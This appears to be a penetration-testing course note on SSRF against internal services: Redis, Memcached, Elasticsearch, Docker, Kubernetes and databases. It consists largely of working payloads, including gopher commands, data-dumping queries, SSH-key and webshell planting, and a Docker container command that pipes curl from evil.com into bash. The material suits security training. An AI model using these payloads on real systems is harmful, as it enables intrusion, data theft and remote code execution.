---
tags: [vapt, ssrf, intermediate]
difficulty: intermediate
module: "13 - SSRF"
topic: "13.12 SSRF — Internal Services (Redis, Elasticsearch, Memcached)"
---

# 13.12 — SSRF to Internal Services

## Redis via SSRF (Gopher Protocol)

```
REDIS SPEAKS A SIMPLE TEXT PROTOCOL (RESP).
If SSRF allows gopher:// → can send raw commands to Redis!

GOPHER PROTOCOL:
  gopher://host:port/_{DATA}
  The _ after / is required, everything after is sent raw.

REDIS SSRF VIA GOPHER:
  # PING Redis:
  url=gopher://127.0.0.1:6379/_PING%0d%0a
  
  # Expected: +PONG
  
  # GET ALL KEYS:
  url=gopher://127.0.0.1:6379/_%2A1%0d%0a%243%0d%0aKEYS%0d%0a%2A%0d%0a
  # (KEYS * command, URL encoded)
  
  # SET A KEY (inject config):
  url=gopher://127.0.0.1:6379/_%2A3%0d%0a%243%0d%0aSET%0d%0a%245%0d%0amykey%0d%0a%245%0d%0ahello%0d%0a
  
  REDIS RCE VIA GOPHER:
  # Write cron job (if running as root):
  # Commands to set dir, dbfilename, then CONFIG SET/SAVE
  
  # WRITE SSH KEY TO REDIS PERSISTENCE:
  # If Redis is running as www-data or root with homedir access:
  # SET /root/.ssh/authorized_keys "ssh-rsa ATTACKER_KEY..."
  # CONFIG SET dir /root/.ssh/
  # CONFIG SET dbfilename authorized_keys
  # SAVE
  → Attacker's SSH key written to disk!
  → SSH into server!

TOOL: redis-over-ssrf / Gopherus:
  python3 gopherus.py --exploit redis
  → Generates gopher URLs for Redis attacks!
```

---

## Elasticsearch via SSRF

```bash
# ELASTICSEARCH IS HTTP-BASED (easy to exploit via SSRF!):

# LIST ALL INDICES:
url=http://127.0.0.1:9200/_cat/indices?v

# GET ALL DATA FROM AN INDEX:
url=http://127.0.0.1:9200/users/_search?size=100
# Returns: all user records!

url=http://127.0.0.1:9200/products/_search?size=1000

# DUMP SPECIFIC FIELDS:
url=http://127.0.0.1:9200/users/_search?_source=email,password&size=100

# GET CLUSTER INFO:
url=http://127.0.0.1:9200/

# GET ALL MAPPING (schema):
url=http://127.0.0.1:9200/_mapping

# SEARCH FOR PASSWORDS/SECRETS:
url=http://127.0.0.1:9200/_search?q=password
url=http://127.0.0.1:9200/_search?q=api_key

# IMPACT:
# Full database dump of whatever Elasticsearch stores!
# Often: user emails, PII, logs, API keys stored in search index!
```

---

## Memcached via SSRF

```
MEMCACHED USES A SIMPLE TEXT PROTOCOL.
Gopher can be used to interact with Memcached!

# READ A SPECIFIC KEY:
url=gopher://127.0.0.1:11211/_get%20secretkey%0d%0a

# IF MEMCACHED HAS SESSIONS:
# Sessions are often stored with keys like: PHPSESSID_abc123
# Reading session data → steal other users' sessions!

# EXAMPLE:
url=gopher://127.0.0.1:11211/_get%20PHPSESSID_VICTIM_SESSION_ID%0d%0a
# Returns session data → extract auth tokens, username, etc.!

TOOL: Gopherus generates Memcached payloads too:
  python3 gopherus.py --exploit memcached
```

---

## Docker API via SSRF

```bash
# DOCKER DAEMON WITHOUT TLS (port 2375) — CRITICAL!

# LIST CONTAINERS:
url=http://127.0.0.1:2375/containers/json

# LIST IMAGES:
url=http://127.0.0.1:2375/images/json

# INSPECT A CONTAINER (get env vars / secrets!):
url=http://127.0.0.1:2375/containers/CONTAINER_ID/json
# Response includes: Env (environment variables with secrets!), Mounts, Networks

# CREATE A CONTAINER WITH VOLUME MOUNT (for RCE!):
# This creates a container mounting the host filesystem:
url=http://127.0.0.1:2375/containers/create
# POST body:
{
  "Image": "ubuntu",
  "Volumes": {"/host": {}},
  "HostConfig": {
    "Binds": ["/:/host"]
  },
  "Cmd": ["chroot", "/host", "bash", "-c", "curl -sk http://evil.com/shell | bash"]
}
# → Container gets full host filesystem access → RCE on host!

# NOTE: POST requests via SSRF require gopher:// or similar protocol smuggling
# GET requests to Docker API already leak a LOT of info!
```

---

## Kubernetes API via SSRF

```bash
# KUBERNETES API (usually :6443 for master node):

# VERSION INFO (no auth needed on some misconfigured clusters):
url=http://10.96.0.1:443/version
url=https://kubernetes.default.svc/version

# SERVICE ACCOUNT TOKEN (if running inside a pod):
url=file:///var/run/secrets/kubernetes.io/serviceaccount/token
# This file contains a JWT token for the pod's service account!

# LIST PODS (with token):
url=http://10.96.0.1:443/api/v1/namespaces/default/pods
# (also use token in Authorization header if needed)

# LIST SECRETS:
url=http://10.96.0.1:443/api/v1/namespaces/default/secrets
# CRITICAL: Contains all Kubernetes secrets (DB passwords, API keys, etc.)!

# EXEC INTO POD (RCE!):
# POST to: /api/v1/namespaces/{ns}/pods/{pod}/exec?command=...

# INTERNAL K8S DNS:
url=http://kubernetes.default.svc/api/v1/namespaces/
```

---

## MySQL/PostgreSQL via Gopher

```
DATABASES CAN ALSO BE REACHED VIA GOPHER:

MYSQL (3306):
  MySQL uses a binary protocol — harder via gopher
  But possible with tool: Gopherus
  
  python3 gopherus.py --exploit mysql
  Enter: MySQL username (often root with no password on internal!)
  Enter: command to execute
  → Generates gopher URL to run MySQL queries!
  
  IF MYSQL ALLOWS FILE OPERATIONS:
  SELECT LOAD_FILE('/etc/passwd')  → read files!
  INTO OUTFILE '/var/www/html/shell.php'  → write webshell!

POSTGRESQL (5432):
  Supports COPY TO/FROM which can read/write files
  Can execute OS commands via COPY TO PROGRAM in some configs
  
  python3 gopherus.py --exploit postgresql
```

---

## Gopherus Tool

```bash
# INSTALL:
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
pip3 install -r requirements.txt

# USAGE:
python3 gopherus.py --exploit redis
python3 gopherus.py --exploit mysql
python3 gopherus.py --exploit postgresql
python3 gopherus.py --exploit memcached
python3 gopherus.py --exploit fastcgi
python3 gopherus.py --exploit zabbix
python3 gopherus.py --exploit smtp

# GENERATES:
# gopher://127.0.0.1:PORT/_ENCODED_PAYLOAD
# Use as SSRF URL!
```

---

## Related Notes
- [[02 - Basic SSRF Fetching Internal URLs]] — basic SSRF
- [[11 - SSRF Internal Port Scanning]] — finding services
- [[13 - SSRF Protocol Smuggling]] — gopher, dict, ftp
- [[18 - SSRF to RCE via Internal Services]] — full RCE chains
